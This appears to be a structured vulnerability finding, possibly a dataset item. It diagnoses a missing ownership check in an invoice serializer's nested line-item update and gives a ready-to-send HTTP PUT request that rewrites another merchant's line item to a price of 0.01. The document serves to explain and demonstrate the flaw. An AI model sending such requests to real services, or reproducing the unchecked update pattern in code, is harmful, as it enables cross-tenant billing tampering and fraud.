diagnosis: BatchInvoiceUpdateSerializer updates invoices along with their nested line items. In the update() method, line items with an id are updated via InvoiceLineItem.objects.filter(id=item_id).update(...) without verifying that line_item.invoice == instance. An attacker can pass arbitrary line item IDs belonging to other merchants' invoices, altering their line item descriptions and billing amounts.
exploit_request:
PUT /api/invoices/204/ HTTP/1.1
Host: invoicing.cloudledger.com
Authorization: Bearer aa99bb88...
Content-Type: application/json

{"invoice_number": "INV-204", "line_items": [{"id": 8841, "description": "Discounted Consulting", "unit_price": "0.01", "quantity": 1}]}
